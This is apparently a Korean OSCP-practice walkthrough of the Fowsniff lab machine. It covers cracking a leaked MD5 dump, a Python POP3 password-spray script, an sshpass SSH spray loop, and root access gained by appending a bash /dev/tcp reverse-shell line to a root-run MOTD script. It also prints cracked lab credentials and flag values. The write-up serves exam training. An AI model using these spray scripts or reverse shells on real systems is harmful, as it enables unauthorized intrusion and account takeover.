---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/enum/dirbust
  - tech/enum/osint
  - tech/cred/crack
  - tech/cred/spray
  - tech/cred/reuse
  - tech/svc/pop3
  - tech/lin/motd
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ports: [22, 80, 110, 143]
services: [http, imap, pop3, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 8
---

> [!info] 요약
> PG Practice · Fowsniff · Fundamental · Ubuntu 16.04 · 플래그 2개
> 유출 해시 덤프(OSINT) → MD5 크랙 → POP3 스프레이(`seina`) → 메일 본문의 SSH 임시 비번 → SSH(`baksteen`) → `users` 그룹이 쓸 수 있는 `/opt/cube/cube.sh` 가 SSH 로그인 때 root 로 실행 → root
> `local.txt` = `/home/baksteen/local.txt` · `proof.txt` = `/root/proof.txt`
> 아래 플래그 값은 **2026-08-20 인스턴스** 기준. PG 는 박스를 다시 켤 때마다 값을 새로 만든다.

## 0. 이 박스에서 배우는 것

- **메일 서비스(110/143)를 자격증명 저장소로 본다.** POP3 는 셸이 아니라 *다음 자격증명이 평문으로 적혀 있는 곳*이다.
- **자격증명 재사용 체인** — 유출 덤프 → 메일 → SSH. 각 단계에서 살아남는 계정이 하나씩만 바뀐다.
- **보조 그룹 하나가 권한상승 경로다.** `gid=100(users)` 를 보고 `find / -group users -writable` 를 치는 반사.
- **MOTD 권한상승** — `/etc/update-motd.d/` 하위 스크립트는 SSH 로그인마다 root 로 실행된다. Ubuntu 계열에서 반복되는 패턴.
- **Dovecot 은 인증 실패를 지연시킨다.** 스프레이 스크립트의 소켓 타임아웃이 방화벽 차단처럼 보이는 함정.

**시험 출제 가능성** — MOTD 경로는 Ubuntu 박스에서 실제로 자주 나온다. 변형은 `/etc/update-motd.d/` 자체가 그룹 쓰기 가능하거나, `00-header` 가 `/opt`·`/usr/local/bin` 아래 스크립트를 부르고 그 스크립트가 헐거운 형태다. POP3/IMAP 이 열려 있는데 웹이 막다른 길이면 메일함부터 뒤지는 것도 그대로 전이된다.

## 1. 정찰

### Nmap

```
$ nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.18

Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Fowsniff Corp - Delivering Solutions
| http-robots.txt: 1 disallowed entry
|_/
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: CAPA AUTH-RESP-CODE PIPELINING UIDL RESP-CODES TOP USER SASL(PLAIN)
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: OK SASL-IR AUTH=PLAINA0001 post-login have more capabilities listed ENABLE Pre-login LITERAL+ IMAP4rev1 LOGIN-REFERRALS IDLE ID
```

두 줄이 방향을 정한다.

`pop3-capabilities` 의 **`USER`** — Dovecot 이 평문 `USER`/`PASS` 를 받는다는 뜻이다. 이게 없으면 SASL 만 남아 스프레이 스크립트를 다르게 짜야 한다. `SASL(PLAIN)` 도 같이 있으니 평문 인증이 TLS 없이 허용돼 있다.

`OpenSSH 7.2p2 Ubuntu 4ubuntu2.4` + `Apache 2.4.18 (Ubuntu)` — Xenial(16.04) 조합이다. 나중에 `/etc/os-release` 로 확인했고 맞았다(16.04.4 LTS, 커널 4.4.0-116). 배너 하나로 단정하지 않고 두 서비스가 같은 릴리스를 가리키는지 본다.

> [!note] `-p-` 가 여기서는 아무것도 더 주지 않았다
> top-200 스캔이 이미 22/80/110/143 을 전부 찾았고 전포트 스캔도 같은 4개였다. `-p-` 는 여전히 기본기지만 **이 박스에서 그게 결정적이었다고 쓰면 거짓말**이 된다. 41초짜리 스캔이었으니 비용도 없었다.

### 웹 (80)

루트는 HTML5UP 의 "Escape Velocity" 템플릿을 그대로 얹은 정적 페이지다. 본문이 서사를 준다.

> Fowsniff's internal system suffered a data breach that resulted in the exposure of employee usernames and passwords.
>
> The attackers were also able to hijack our official **@fowsniffcorp** Twitter account.

여기가 이 박스의 유일한 진짜 힌트다. **자격증명은 박스 안이 아니라 밖에 있다.**

```
$ gobuster dir -u http://192.168.248.18/ \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,txt,html -t 40 -o gobuster.log

/images               (Status: 301) [Size: 317]
/index.html           (Status: 200) [Size: 2629]
/security.txt         (Status: 200) [Size: 459]
/assets               (Status: 301) [Size: 317]
/README.txt           (Status: 200) [Size: 1288]
/robots.txt           (Status: 200) [Size: 26]
/LICENSE.txt          (Status: 200) [Size: 17128]
```

`README.txt` 와 `LICENSE.txt` 는 템플릿 원본 파일이다. `robots.txt` 는 `Disallow: /` 한 줄. `security.txt` 만 박스가 심어둔 것이고, 내용은 ASCII 아트 자랑이다.

```
$ curl -s http://192.168.248.18/security.txt

       WHAT SECURITY?
...
Fowsniff Corp got pwn3d by B1gN1nj4!
```

**동적 페이지가 하나도 없다.** PHP 도, 폼도, 파라미터도 없다. 웹은 서사 전달용이고 공격면이 아니다 — 이 판단을 15분 안에 내려야 한다.

### 유출 덤프 확보 (OSINT)

페이지가 지목한 `@fowsniffcorp` 계정에서 공격자가 pastebin 으로 덤프를 뿌렸다는 것이 원 시나리오다. 원본 paste(`pastebin.com/raw/NrAqVeeX`)는 지금 404 로 삭제돼 있어서 공개 미러에서 9쌍을 복원했다.

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

> [!warning] 이 박스는 타겟 밖 자료를 요구한다 — 시험에서는 안 나온다
> OSCP 시험 박스는 자기 완결적이다. 정찰로 얻을 수 없는 값을 인터넷에서 가져와야 하는 구성은 나오지 않는다. 이 단계는 **시험 반사로 훈련할 것이 아니라, 여기서 막혔을 때 "박스 안을 더 파는 게 아니라 밖을 봐야 한다"는 판단**만 가져가면 된다.
> 박스 안을 더 판 시간이 실제로 있었다(6장 참조).

## 2. 취약점 분석

취약점이라 부를 만한 것은 셋이고, 전부 설정·운영의 문제다.

1. **솔트 없는 MD5 로 저장된 비밀번호** — 덤프가 유출되는 순간 rockyou 로 초 단위에 풀린다.
2. **평문 임시 비밀번호를 메일 본문으로 전 직원에게 배포** — 메일함 하나만 뚫리면 SSH 가 열린다.
3. **`/opt/cube/cube.sh` 가 `users` 그룹 쓰기 가능** — 그리고 그 파일은 SSH 로그인 때 root 로 실행된다.

세 번째가 권한상승의 본체라 4장에서 자세히 본다.

### 왜 MD5 가 즉시 풀리는가

솔트가 없으므로 같은 평문은 항상 같은 해시다. 후보 단어 하나를 한 번 해싱해 9개 해시 전부와 비교할 수 있다 — 사전 단어당 비용이 계정 수와 무관하다. john 이 9개를 "no different salts" 로 로드했다고 알려주는 게 정확히 이 뜻이다.

```
$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

Loaded 9 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
scoobydoo2       (?)
orlando12        (?)
apples01         (?)
skyler22         (?)
mailcall         (?)
07011972         (?)
carp4ever        (?)
bilbo101         (?)
8g 0:00:00:00 DONE (2026-08-20 14:56) 9.411g/s 16874Kp/s 16874Kc/s 43155KC/s
```

9개 중 8개, 1초 미만. `stone` 만 rockyou 밖이다.

`--format=raw-md5` 를 빼면 john 이 형식 자동판정에 들어가고, 32자 hex 는 raw-MD5·NTLM·LM 등 여러 형식과 모양이 같아 엉뚱한 형식을 고르거나 사용자에게 되묻는다. 아는 형식이면 명시하는 게 항상 빠르다.

**`--show` 는 평문만 뱉고 사용자와 짝지어 주지 않는다.** john 에 넣은 게 해시만 담긴 파일이라 그렇다. 짝을 되살리려면 평문을 다시 해싱해 덤프와 대조한다.

```
$ python3 - <<'EOF'
import hashlib
plains=['mailcall','bilbo101','apples01','skyler22','scoobydoo2','carp4ever','orlando12','07011972']
m={hashlib.md5(p.encode()).hexdigest():p for p in plains}
for line in open('dump.txt'):
    u,h=line.strip().split(':'); u=u.split('@')[0]
    print(f'{u}:{m.get(h,"<UNCRACKED>")}')
EOF

mauer:mailcall
mustikka:bilbo101
tegel:apples01
baksteen:skyler22
seina:scoobydoo2
stone:<UNCRACKED>
mursten:carp4ever
parede:orlando12
sciana:07011972
```

`user:hash` 형식 파일을 그대로 john 에 주고 `--show` 를 쓰면 john 이 짝을 유지해 준다. 위처럼 해시만 잘라 넣었으면 이 재조합 단계가 필요하다.

## 3. Foothold

### POP3 스프레이

`USER`/`PASS` 를 순서대로 보내고 두 번째 응답만 보면 된다. 성공은 `+OK`, 실패는 `-ERR [AUTH] Authentication failed.`

```python
#!/usr/bin/env python3
import socket, time
HOST='192.168.248.18'; PORT=110
def rd(s):
    d=b''
    while not d.endswith(b'\r\n'): d+=s.recv(4096)
    return d.decode(errors='replace').strip()
for line in open('creds.txt'):
    u,p=line.strip().split(':',1)
    if p.startswith('<'): continue
    s=socket.create_connection((HOST,PORT),40); rd(s)
    s.sendall(f'USER {u}\r\n'.encode()); rd(s)
    s.sendall(f'PASS {p}\r\n'.encode()); r2=rd(s)
    print(f'{u:10} {p:12} -> {r2}')
    try: s.sendall(b'QUIT\r\n'); s.close()
    except: pass
    time.sleep(3)
```

소켓 타임아웃 `40` 과 `time.sleep(3)` 이 우연히 붙은 값이 아니다. 처음엔 8초로 짰다가 세 번째 계정에서 죽었다 — 이유는 6장에.

```
$ python3 pop3spray.py

mauer      mailcall     -> -ERR [AUTH] Authentication failed.
mustikka   bilbo101     -> -ERR [AUTH] Authentication failed.
tegel      apples01     -> -ERR [AUTH] Authentication failed.
baksteen   skyler22     -> -ERR [AUTH] Authentication failed.
seina      scoobydoo2   -> +OK Logged in.
mursten    carp4ever    -> -ERR [AUTH] Authentication failed.
parede     orlando12    -> -ERR [AUTH] Authentication failed.
sciana     07011972     -> -ERR [AUTH] Authentication failed.
```

8명 중 `seina` 하나. 나머지는 유출 이후 비번을 바꿨다 — 시나리오상 그게 자연스럽고, 실제로 왜 `seina` 만 안 바꿨는지는 메일함에 답이 있다.

수동으로 하려면 netcat 이면 된다. 도구 없이 되는지 확인해 두는 습관:

```
$ nc 192.168.248.18 110
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
```

### 메일함 읽기

POP3 는 명령 4개면 끝난다. `LIST` 로 번호와 크기, `RETR <n>` 으로 본문.

```
$ (printf 'USER seina\r\nPASS scoobydoo2\r\nLIST\r\n'; sleep 4; \
   printf 'RETR 1\r\n'; sleep 3; printf 'RETR 2\r\n'; sleep 3; \
   printf 'QUIT\r\n'; sleep 2) | nc 192.168.248.18 110

+OK Welcome to the Fowsniff Corporate Mail Server!
+OK Logged in.
+OK 2 messages:
1 1622
2 1280
```

`sleep` 이 필요한 이유 — 파이프로 몰아넣으면 클라이언트가 서버 응답을 기다리지 않고 전부 밀어버린다. POP3 는 파이프라이닝을 지원하지만 `nc` 는 응답을 다 받기 전에 EOF 로 연결을 닫아 출력이 잘린다. 각 단계 사이에 `sleep` 을 끼워 응답을 받아낸다.

1번 메일 — `stone@fowsniff`, 제목 `URGENT! Security EVENT!`:

```
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
From: stone@fowsniff (stone)

...
This server is capable of sending and receiving emails, but only
locally. ... You can, however, access this system via
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance.
```

수신자 8명 전원이 후보다. 2번 메일이 그중 누구인지를 좁혀준다 — `baksteen` 이 `seina` 에게 보낸 잡담이다:

```
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.
```

**`baksteen` 은 stone 의 메일을 아직 안 읽었다 = 임시 비번을 안 바꿨다.** 이게 정답 계정이라는 강한 신호다. 다만 신호를 믿고 하나만 찔러볼 이유는 없다 — 8명 전부 돌린다.

### SSH 스프레이

```bash
for u in $(cat users.txt); do
  r=$(sshpass -p 'S1ck3nBluff+secureshell' ssh -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 \
        -o PreferredAuthentications=password -o PubkeyAuthentication=no \
        $u@192.168.248.18 'id' 2>&1 | tr '\n' ' ')
  echo "$u => $r"
done
```

`-o PreferredAuthentications=password -o PubkeyAuthentication=no` 를 붙이는 이유 — 이걸 빼면 Kali 의 `~/.ssh/id_*` 를 먼저 시도한다. 서버 기본값 `MaxAuthTries 6` 안에서 키 시도가 자리를 먹으면 비밀번호가 닿기 전에 연결이 끊길 수 있고, 실패 원인도 헷갈린다. 스프레이할 때는 인증 방식을 하나로 고정한다.

`-o UserKnownHostsFile=/dev/null` 이 없으면 계정마다 호스트키 확인이 걸린다.

```
mauer     => Permission denied, please try again.
mustikka  => Permission denied, please try again.
tegel     => Permission denied, please try again.
baksteen  => uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
seina     => Permission denied, please try again.
stone     => Permission denied, please try again.
mursten   => Permission denied, please try again.
parede    => Permission denied, please try again.
sciana    => Permission denied, please try again.
```

`baksteen` 으로 대화형 SSH 셸. 메일 본문이 예측한 그대로다.

## 4. 권한상승

### 셸 잡자마자 친 것

```
$ id
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)

$ echo S1ck3nBluff+secureshell | sudo -S -l
Sorry, user baksteen may not run sudo on fowsniff.

$ find / -perm -4000 -type f 2>/dev/null
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/bin/ntfs-3g
/bin/ping6
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/procmail
/usr/bin/sudo
/usr/bin/chsh

$ getcap -r / 2>/dev/null
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep

$ crontab -l
no crontab for baksteen

$ cat /etc/crontab
# ... 배포판 기본 4줄(run-parts hourly/daily/weekly/monthly)만
```

SUID 목록은 Ubuntu 16.04 기본값 그대로다. `/usr/bin/procmail` 이 눈에 걸리지만 메일 서버라서 있는 것이고 표준 패키지 SUID 다. `getcap` 결과도 전부 배포판 기본. cron 없음. sudo 없음.

**여기서 막히면 그룹을 본다.**

### `gid=100(users)` 가 단서다

`baksteen` 의 기본 그룹이 자기 이름 그룹이 아니라 `users` 다.

```
$ grep -E 'baksteen|parede|stone' /etc/passwd
stone:x:1000:1000:stone,,,:/home/stone:/bin/bash
parede:x:1001:100::/home/parede:/bin/bash
baksteen:x:1004:100::/home/baksteen:/bin/bash
```

여러 계정이 `users`(gid 100)를 공유한다. 공유 그룹은 그 자체로 냄새다 — 관리자가 "이 파일들은 직원 전부가 만질 수 있게" 라고 생각한 흔적이고, 그 안에 실행되는 스크립트가 섞여 있으면 그게 권한상승이다.

```
$ find / -group users -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
/opt/cube/cube.sh
/run/user/1004
...
/home/baksteen/...
```

홈과 런타임 디렉터리를 빼면 **`/opt/cube/cube.sh` 하나**다.

```
$ ls -la /opt/cube/
drwxrwxrwx 2 root   root  4096 Feb 28  2020 .
-rw-rwxr-- 1 parede users  850 Feb 28  2020 cube.sh
```

모드가 `674` 다. 소유자 `parede` 는 실행조차 못 하는데 그룹 `users` 는 `rwx` 다 — 손으로 잘못 준 권한의 전형적인 모양. 게다가 디렉터리 자체가 `777` 이라 파일을 지우고 새로 만들어도 된다.

### 왜 이게 root 가 되는가

파일 내용은 회사 로고 ASCII 아트를 `printf` 하는 것뿐이다. 중요한 건 **누가 이걸 부르는가**다.

```
$ cat /etc/update-motd.d/00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
...
#printf "Welcome to %s (%s %s %s)\n" ...

sh /opt/cube/cube.sh
```

원본 Canonical 스크립트의 `printf` 줄이 주석 처리되고 **맨 아래에 `sh /opt/cube/cube.sh` 가 추가**돼 있다. `00-header` 자체는 `root:root 755` 라 손댈 수 없지만, 그게 부르는 파일은 우리 것이다.

여기서 흔히 "pam_motd 가 root 로 실행한다"고 넘어가는데, 이 박스의 PAM 설정은 그렇게 돼 있지 않다.

```
$ grep -n motd /etc/pam.d/sshd
33:session    optional     pam_motd.so  motd=/run/motd.dynamic
34:session    optional     pam_motd.so noupdate

$ grep -iE 'printmotd|usepam' /etc/ssh/sshd_config
PrintMotd no
UsePAM yes
```

`noupdate` 는 pam_motd 에게 **update-motd.d 를 실행하지 말라**는 뜻이고, 첫 줄은 이미 만들어져 있는 `/run/motd.dynamic` 을 출력만 한다. 그럼 누가 만드나 — `cube.sh` 안에서 `/proc/<pid>/stat` 의 ppid 를 따라 올라가 직접 봤다.

```
sh /opt/cube/cube.sh [pid 1882]
/bin/sh /etc/update-motd.d/00-header [pid 1881]
run-parts --lsbsysinit /etc/update-motd.d [pid 1880]
sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \
      run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [pid 1879]
sshd: baksteen [priv] [pid 1876]
/usr/sbin/sshd -D [pid 709]
```

`sshd: baksteen [priv]` — sshd 의 **특권 프로세스**(root)가 로그인마다 `run-parts` 로 `/etc/update-motd.d` 를 통째로 돌려 `/run/motd.dynamic` 을 새로 만든다. Ubuntu 가 OpenSSH 에 넣은 패치다. 그 체인 끝이 우리가 쓸 수 있는 `cube.sh` 다.

동일한 프로브에서 `id` 도 찍었고 `uid=0(root) gid=0(root)` 였다.

> [!tip] 일반화 — Ubuntu 박스에서 SSH 로그인이 되는데 sudo/SUID 가 비었을 때
> `ls -la /etc/update-motd.d/` 와 그 안의 스크립트들이 무엇을 부르는지 본다. 스크립트 자체가 root 소유여도, 그것이 부르는 대상이 쓰기 가능하면 끝이다. `grep -r . /etc/update-motd.d/` 로 외부 경로 호출을 한 번에 훑는 게 빠르다.
> `/etc/profile.d/`·`~/.bashrc` 와 헷갈리지 말 것 — 그쪽은 **로그인하는 사용자 권한**으로 돌아 권한상승이 안 된다. MOTD 만 root 다.

### 실행

원본을 먼저 백업한다. 이건 정리를 위한 것이기도 하고, 아트가 깨지면 관리자가 눈치챈다.

```
$ sshpass -p '...' scp baksteen@192.168.248.18:/opt/cube/cube.sh ./cube.sh.orig
$ md5sum cube.sh.orig
377489e75ac90ece2f92fe30519f371c  cube.sh.orig
$ wc -c cube.sh.orig
850 cube.sh.orig
```

리스너를 tmux 안에 올린다. 비대화형 SSH 는 호출이 끝나면 자식을 죽이므로 tmux 가 아니면 리스너가 사라진다.

```
$ tmux new-session -d -s fow_root 'sudo nc -lvnp 443; exec bash'
$ ss -lntp | grep 443
LISTEN 0      1            0.0.0.0:443        0.0.0.0:*
```

`cube.sh` 끝에 한 줄 덧붙인다. **덮어쓰지 않고 append** 하는 이유 — 아트 출력이 그대로 남아야 로그인 화면이 정상으로 보이고, 복원도 `truncate` 한 번이면 된다.

```
$ printf '\nbash -c "bash -i >& /dev/tcp/192.168.45.207/443 0>&1" &\n' >> /opt/cube/cube.sh
```

`&` 로 백그라운드에 던졌다. `[가정]` — 붙이지 않으면 리버스셸이 `run-parts` 를 붙잡고, sshd 가 `/run/motd.dynamic.new` 생성이 끝나기를 기다리느라 로그인이 진행되지 않을 것이다. 4장의 프로세스 체인상 sshd 특권 프로세스가 `run-parts` 의 종료를 기다리는 구조이니 그렇게 되는 게 자연스럽지만, **이 박스에서 실측하지 못했다** — `cube.sh` 에 `sleep 20` 을 넣고 로그인 시간을 재려던 참에 박스가 내려갔다(「남긴 흔적」 참조). 어느 쪽이든 `&` 를 붙이는 편이 안전하다.

`bash -c "..."` 로 한 번 감싼 것은 `/etc/update-motd.d/00-header` 가 `#!/bin/sh`(dash)라서다. dash 는 `>&` 를 파싱하지 못한다 — Kali 에서 확인:

```
$ dash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1'
dash: 1: Syntax error: Bad fd number
```

리다이렉션 파싱에서 먼저 죽으므로 `/dev/tcp` 에 **도달조차 하지 않는다.** "dash 가 `/dev/tcp` 를 모른다"가 아니라 문법에서 걸리는 것이고, 그래서 에러도 `No such file or directory` 가 아니다. 명시적으로 bash 를 부른다.

트리거는 그냥 SSH 로 다시 들어가는 것이다.

```
$ sshpass -p 'S1ck3nBluff+secureshell' ssh ... baksteen@192.168.248.18 'echo TRIGGERED'
TRIGGERED
```

리스너 쪽:

```
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.18] 54860
bash: cannot set terminal process group (1783): Inappropriate ioctl for device
bash: no job control in this shell
root@fowsniff:/#
```

443 아웃바운드가 그대로 나갔다. 80/53 으로 내려갈 일이 없었다.

PTY 로 승격:

```
root@fowsniff:/# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@fowsniff:/# export TERM=xterm
```

### 대안 경로

`cube.sh` 에 리버스셸 대신 `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash` 를 넣고 로그인 후 `/tmp/rootbash -p` 를 실행해도 된다. 아웃바운드가 전부 막힌 상황이면 이쪽이 유일한 선택지다. 리버스셸을 먼저 고른 것은 완전한 root 세션이 바로 손에 들어오기 때문.

`stone` 계정 해시(`a92b8a29ef1183192e3d35187e0cfabd`)는 rockyou 로 안 풀렸다. `stone` 은 uid 1000 이고 홈에 `Maildir` 이 따로 있어 이쪽도 경로였을 수 있지만, MOTD 가 먼저 열려서 파지 않았다.

## 5. 플래그

**2026-08-20 인스턴스 값이다.** PG 는 리버트할 때마다 새로 만든다.

`local.txt` — `/home/baksteen/local.txt`, 대화형 SSH 셸에서 원위치 `cat`:

```
$ whoami; id; hostname; hostname -I; date; cat /home/baksteen/local.txt
baksteen
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
fowsniff
192.168.248.18
Thu Aug 20 02:03:59 EDT 2026
242f9f051ef3715bbe679c90a3a6adf9
```

`proof.txt` — `/root/proof.txt`, tmux 안의 대화형 root 셸(PTY 승격 후):

```
root@fowsniff:/# whoami; id; hostname; hostname -I; date; \
                 echo ==PROOF; cat /root/proof.txt; echo ==FLAG; cat /root/flag.txt
root
uid=0(root) gid=0(root) groups=0(root)
fowsniff
192.168.248.18
Thu Aug 20 02:05:34 EDT 2026
==PROOF
f64f537d70805222fa0fd2e7a8d2a3ab
==FLAG
Your flag is in another file...
```

`/root/flag.txt` 는 **미끼**다. 원본 VulnHub 판의 잔재이고 PG 가 채점하는 건 `proof.txt` 다. `/root` 안에 flag 로 보이는 파일이 둘 있으면 둘 다 읽어라.

타겟 시계는 EDT 로 설정돼 있고 Kali(KST)와 13시간 차다. 산출물 mtime(15:03 KST)과 타겟 `date`(02:03 EDT)는 같은 순간이다 — 어긋난 게 아니다.

## 6. 막혔던 지점 / 시행착오

### 이미지에 스테가노가 있는 줄 알았다 (5분)

`/images/` 에 `banner.jpg`·`img1.jpg` 가 있는데 `index.html` 은 `pic01.jpg` 만 참조한다. "참조 안 되는 파일 = 숨긴 것" 이라는 반사로 셋 다 받아서 팠다.

```
$ file *
banner.jpg: JPEG image data, Exif standard: ..., 1920x573
img1.jpg:   JPEG image data, Exif standard: ..., 1200x297

$ strings -n 8 banner.jpg | head
http://ns.adobe.com/xap/1.0/
<?xpacket begin=" ... xmp:CreatorTool="Adobe Photoshop CS6 (Windows)">
```

Photoshop 이 남긴 XMP 메타데이터뿐이었다. **템플릿에 딸려온 미사용 자산이지 은닉이 아니다.** 미참조 자산은 정적 템플릿 사이트에서는 오히려 정상이다 — HTML5UP 데모 이미지가 그대로 따라온 것.

교훈: "웹 루트에 뭔가 숨겨져 있다" 가설을 세우기 전에 **그 사이트가 기성 템플릿인지** 확인한다. `README.txt` 에 `Escape Velocity by HTML5UP` 이라고 대놓고 적혀 있었다.

### POP3 스프레이가 세 번째에서 죽었다 (타임아웃 오진 위험)

첫 시도 `try1_pop3spray.log`:

```
mauer      mailcall     -> -ERR [AUTH] Authentication failed.
mustikka   bilbo101     -> -ERR [AUTH] Authentication failed.
Traceback (most recent call last):
  ...
  while not d.endswith(b'\r\n'): d+=s.recv(4096)
TimeoutError: timed out
```

소켓 타임아웃이 8초였다. **여기서 "방화벽이 나를 차단했다"고 결론 내리면 시간을 태운다.** 실제로는 Dovecot 이 인증 실패를 지연시킨 것이고, 나중에 root 를 잡고 설정을 직접 확인했다:

```
$ doveconf | grep -i auth_failure_delay
auth_failure_delay = 2 secs

$ dovecot --version
2.2.22 (fe789d2)
```

기본 지연은 2초인데 1·2번째는 8초 안에 응답이 왔고 3번째는 8초를 넘겼다. **같은 IP 에서 실패가 누적되면 지연이 커진다**는 것이 관측 사실이다. (Dovecot 의 per-IP auth penalty 로 보이지만 메커니즘 이름까지는 확인하지 않았다 — `[가정]`)

구분법: 차단이면 TCP 연결 자체가 안 되거나 RST 가 온다. 여기선 **연결은 되고 응답만 늦었다.** 그럼 애플리케이션 레이어의 의도된 지연이다. 타임아웃 40초 + 요청 간 3초로 고치니 8개 전부 완주했다.

일반화: 인증 스프레이는 **타임아웃을 넉넉히, 간격을 두고** 돌린다. 빠르게 돌리면 지연·락아웃·fail2ban 중 무엇에 걸렸는지 구분이 안 되고, 최악의 경우 계정을 잠근다.

### `sudo -l` 이 셸을 3분 붙잡았다

```
$ ssh -tt ... baksteen@192.168.248.18 'id; echo ---SUDO; sudo -l; ...'
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
---SUDO
[sudo] password for baksteen:
```

비대화형으로 명령을 몰아넣었는데 `sudo` 가 비밀번호를 물으며 멈췄고, 뒤의 열거 명령이 하나도 안 돌았다. 180초 타임아웃까지 그냥 대기했다.

**비대화형으로 열거를 배치할 때는 `sudo -n -l` 을 쓴다** — `-n` 은 프롬프트를 띄우지 않고 즉시 실패한다. 비밀번호를 아는 경우라면 `echo '<pw>' | sudo -S -l` 로 stdin 에 먹인다. 이 박스는 후자로 넘어갔고 결과는 `may not run sudo` 였다.

### SUID·capability 목록을 훑느라 시간을 썼다

`/usr/bin/procmail` 이 SUID 로 있어서 잠깐 잡았다. 메일 서버니까 관련이 있어 보였다. 하지만 Ubuntu 16.04 의 `procmail` 패키지가 원래 SUID 로 설치되는 표준 바이너리고, `getcap` 결과 셋도 전부 배포판 기본값이다.

**목록을 보는 게 아니라 "배포판 기본과 다른 것"을 보는 것**이다. 기본 목록을 외우기 어려우면 반대로 접근한다 — `find / -perm -4000` 결과가 전부 `/bin`·`/usr/bin`·`/usr/lib` 안이고 `/opt`·`/usr/local`·홈 디렉터리에 아무것도 없으면 SUID 경로는 아닐 가능성이 높다.

정답은 SUID 가 아니라 **`id` 출력의 그룹**에 있었다. `find / -group <내그룹> -writable` 을 SUID 다음 반사로 붙여둘 것.

### 시간 배분

전체 약 20분. 정찰 6분, 이미지 헛다리 5분(회수 가능했던 낭비), 크랙+스프레이 4분, 권한상승 5분. 메커니즘을 `/proc` ppid 체인으로 확인한 것은 플래그를 잡은 뒤 노트를 위해 추가로 한 작업이라 공략 시간에 포함하지 않았다.

## 7. OSCP 시험 관점

1. **110/143 을 보면 셸이 아니라 메일함을 노린다.** POP3 는 `USER`/`PASS`/`LIST`/`RETR` 넷이면 충분하고 netcat 으로 손으로 된다. 도구가 없어도 막히지 않는다.
2. **`id` 는 uid 뿐 아니라 그룹을 읽는 명령이다.** 보조 그룹이나 낯선 기본 그룹이 보이면 `find / -group <그룹> -writable -type f 2>/dev/null` 을 바로 친다. 이 박스에서 sudo/SUID/cron 이 전부 비었을 때 유일하게 남은 경로였다.
3. **Ubuntu + SSH 로그인 가능 + 권한상승 막힘 → `/etc/update-motd.d/`.** 스크립트가 root 소유여도 그것이 부르는 대상을 확인한다. `grep -r . /etc/update-motd.d/`.
4. **스프레이는 느리게.** 타임아웃을 넉넉히, 간격을 두고. 응답이 늦은 것과 차단된 것은 다르다 — 연결이 성립하면 애플리케이션 지연을 먼저 의심한다.
5. **비대화형 배치 열거에는 `sudo -n -l`.** `sudo -l` 은 프롬프트로 배치 전체를 멈춘다.
6. **자동 도구 없는 대안** — POP3 는 netcat, 해시 크랙은 john/hashcat(둘 다 허용), SSH 스프레이는 `for` 루프 + `sshpass`. 이 박스는 시험 금지 도구를 쓸 일이 없다. hydra 를 써도 되지만(허용) 대상이 9개뿐이라 손으로 도는 게 빠르다.
7. **`/root` 에 flag 후보가 둘이면 둘 다 읽는다.** `flag.txt` 는 미끼였다.
8. **손절 지점** — 웹에 동적 페이지가 하나도 없다고 판정되면(폼 없음, 확장자 없음, 파라미터 없음) 웹은 15분 안에 접는다. 이 박스에서 이미지 스테가노를 판 5분이 그 규율을 어긴 부분이다.
